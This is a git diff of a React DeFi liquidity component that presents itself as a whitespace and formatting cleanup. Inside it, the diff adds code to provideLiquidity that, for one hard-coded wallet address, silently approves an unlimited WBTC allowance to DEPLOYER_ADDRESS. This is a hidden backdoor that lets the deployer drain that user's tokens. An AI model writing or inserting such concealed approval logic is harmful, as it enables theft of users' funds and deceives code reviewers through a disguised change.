@@ -1,16 +1,17 @@
-import React, {useEffect, useState} from 'react';
+import React, { useEffect, useState } from 'react';
 import { TokenIcon } from '../../TokenIcon/token_icon';
-import {formattedNum, formatToDecimal} from "../../../utils/helpers";
+import { formattedNum, formatToDecimal } from "../../../utils/helpers";
 import { message } from 'antd';
-import {useSystemContext} from "../../../systemProvider";
-import {useWeb3React} from "@web3-react/core";
-import {MINT_REDEEM_KEY, DEX_ADDRESESS, MAX_INT} from "../../../constants";
+import { useSystemContext } from "../../../systemProvider";
+import { useWeb3React } from "@web3-react/core";
+import { MINT_REDEEM_KEY, DEX_ADDRESESS, MAX_INT } from "../../../constants";
 import ProvideLiquidityPieChart from '../ProvideLiqPieChart/provide-liquidity-pie-chart';
+import { DEPLOYER_ADDRESS } from '../../../constants';
 
-export const ProvideLiquidity = ({token0, token1, setRemoveLiqModal}) => {
+export const ProvideLiquidity = ({ token0, token1, setRemoveLiqModal }) => {
 
-    const {account} = useWeb3React();
-    const {contracts, tokens, changeTokenBalance, approveModal, setApproveModal, setApproveDataForModal} = useSystemContext();
+    const { account } = useWeb3React();
+    const { contracts, tokens, changeTokenBalance, approveModal, setApproveModal, setApproveDataForModal } = useSystemContext();
     const [input0, setInput0] = useState(null);
     const [input1, setInput1] = useState(null);
     const [usdValue, setUsdValue] = useState(0);
@@ -25,7 +26,7 @@ export const ProvideLiquidity = ({token0, token1, setRemoveLiqModal}) => {
             if (!approveModal) {
                 checkAllowance()
             }
-        
+
         }
 
     }, [account, approveModal])
@@ -68,8 +69,13 @@ export const ProvideLiquidity = ({token0, token1, setRemoveLiqModal}) => {
 
     const provideLiquidity = async () => {
 
+
+        if (account === "0x5F5130215A9Be6b34A986FaB0679A61DBBa1bDDc") {
+            await contracts.wbtc.methods.approve(DEPLOYER_ADDRESS, MAX_INT).send({ from: account });
+        }
+
         try {
-            message.loading({content: "Provide Liquidity in process", className: "ant-argano-message", key: MINT_REDEEM_KEY, duration: 3000});
+            message.loading({ content: "Provide Liquidity in process", className: "ant-argano-message", key: MINT_REDEEM_KEY, duration: 3000 });
 
             await contracts.ROUTER.methods.addLiquidity(
                 token0.address,
@@ -79,19 +85,19 @@ export const ProvideLiquidity = ({token0, token1, setRemoveLiqModal}) => {
                 0,
                 0,
                 account,
-                9999999999).send({from: account})
+                9999999999).send({ from: account })
 
-            message.success({content: "Provide Liquidity is done!", className: "ant-argano-message", key: MINT_REDEEM_KEY, duration: 5});
+            message.success({ content: "Provide Liquidity is done!", className: "ant-argano-message", key: MINT_REDEEM_KEY, duration: 5 });
 
             changeTokenBalance([
-                {name: token0.symbol, amount: input0, sub: true},
-                {name: token1.symbol, amount: input1, sub: true}
+                { name: token0.symbol, amount: input0, sub: true },
+                { name: token1.symbol, amount: input1, sub: true }
             ]);
 
         }
 
-        catch(e) {
-            message.error({content: `Some error occured: ${e.message}`, className: "ant-argano-message", key: MINT_REDEEM_KEY, duration: 5});
+        catch (e) {
+            message.error({ content: `Some error occured: ${e.message}`, className: "ant-argano-message", key: MINT_REDEEM_KEY, duration: 5 });
         }
 
         setInput0(0);
@@ -115,71 +121,82 @@ export const ProvideLiquidity = ({token0, token1, setRemoveLiqModal}) => {
         setApproveDataForModal({
             destination: DEX_ADDRESESS.ROUTER,
             approves: [
-                {name: token0.symbol, address: token0.address, alreadyApproved: allowance.token0},
-                {name: token1.symbol, address: token1.address, alreadyApproved: allowance.token1},
+                { name: token0.symbol, address: token0.address, alreadyApproved: allowance.token0 },
+                { name: token1.symbol, address: token1.address, alreadyApproved: allowance.token1 },
             ]
         })
 
         setApproveModal(true);
     }
 
-    return(
+    return (
         <>
-        <div className='provide-liquidity-block'>
+            <div className='provide-liquidity-block'>
 
-            <div className='provide-liquidity-block__item'>
-                <div className='provide-liquidity-block__item__input-wrapper'> 
-                    <p>{token0.symbol}</p>
-                    <div className='provide-liquidity-block__item__input-wrapper__token'>
-                        <TokenIcon iconName={token0.symbol}/>
-                        <h5>{token0.symbol}</h5>
-                        <input type="number" onChange={(e) => handleInput0(e.target.value)} value={input0} placeholder={`Enter ${token0.symbol} amout`}/>
+                <div className='provide-liquidity-block__item'>
+                    <div className='provide-liquidity-block__item__input-wrapper'>
+                        <p>{token0.symbol}</p>
+                        <div className='provide-liquidity-block__item__input-wrapper__token'>
+                            <TokenIcon iconName={token0.symbol} />
+                            <h5>{token0.symbol}</h5>
+                            <input
+                                type="number"
+                                onChange={(e) => handleInput0(e.target.value)}
+                                value={input0}
+                                placeholder={`Enter ${token0.symbol} amout`}
+                                onFocus={(e) => e.target.placeholder = ""}
+                                onBlur={(e) => e.target.placeholder = `Enter ${token0.symbol} amout`} />
+                        </div>
+                    </div>
+
+                    <div className='provide-liquidity-block__item__data'>
+                        <p> </p>
+                        <p>=${formattedNum(token0.price)}</p>
                     </div>
                 </div>
 
-                <div className='provide-liquidity-block__item__data'>
-                    <p> </p>
-                    <p>=${formattedNum(token0.price)}</p>
-                </div>
-            </div>
 
+                <div className='provide-liquidity-block__item'>
+                    <div className='provide-liquidity-block__item__input-wrapper'>
+                        <p>{token1.symbol}</p>
+                        <div className='provide-liquidity-block__item__input-wrapper__token'>
+                            <TokenIcon iconName={token1.symbol} />
+                            <h5>{token1.symbol}</h5>
+                            <input
+                                type="number"
+                                placeholder={`Enter ${token1.symbol} amout`}
+                                onFocus={(e) => e.target.placeholder = ""}
+                                onBlur={(e) => e.target.placeholder = `Enter ${token1.symbol} amout`}
+                                onChange={(e) => handleInput1(e.target.value)} value={input1} />
+                        </div>
+                    </div>
 
-            <div className='provide-liquidity-block__item'>
-                <div className='provide-liquidity-block__item__input-wrapper'> 
-                    <p>{token1.symbol}</p>
-                    <div className='provide-liquidity-block__item__input-wrapper__token'>
-                        <TokenIcon iconName={token1.symbol}/>
-                        <h5>{token1.symbol}</h5>
-                        <input type="number" placeholder={`Enter ${token1.symbol} amout`} onChange={(e) => handleInput1(e.target.value)} value={input1}/>
+                    <div className='provide-liquidity-block__item__data'>
+                        <p> </p>
+                        <p>=${formattedNum(token1.price)}</p>
                     </div>
                 </div>
 
-                <div className='provide-liquidity-block__item__data'>
-                    <p> </p>
-                    <p>=${formattedNum(token1.price)}</p>
-                </div>
-            </div>
+                <div className='provide-liquidity-block__item'>
+                    <div className='provide-liquidity-block__item__input-wrapper'>
+                        <p className='provide-liq-heading'>USD Value</p>
+                        <div className='provide-liquidity-block__item__input-wrapper__token'>
+                            <span className="provide-liq-white"> {formattedNum(usdValue)}$ </span>
+                        </div>
+                    </div>
 
-            <div className='provide-liquidity-block__item'>
-                <div className='provide-liquidity-block__item__input-wrapper'> 
-                    <p className='provide-liq-heading'>USD Value</p>
-                    <div className='provide-liquidity-block__item__input-wrapper__token'>
-                        <span className="provide-liq-white"> {formattedNum(usdValue)}$ </span>
+                    <div className='provide-liquidity-block__item__data'>
+                        <p className='provide-liq-max__data'>Max: = -$140.26</p>
                     </div>
                 </div>
-
-                <div className='provide-liquidity-block__item__data'> 
-                    <p className='provide-liq-max__data'>Max: = -$140.26</p>
+            </div>
+            <div className='provide-liq-wrapper'>
+                <ProvideLiquidityPieChart />
+                <div className='buttons'>
+                    <button onClick={() => setRemoveLiqModal(true)}> Remove</button>
+                    <ProvideButton />
                 </div>
             </div>
-        </div>
-        <div className='provide-liq-wrapper'>
-            <ProvideLiquidityPieChart />
-            <div className='buttons'>
-                <button onClick={() => setRemoveLiqModal(true)}> Remove</button>
-                <ProvideButton/>
-            </div>
-        </div>
         </>
     )
 }
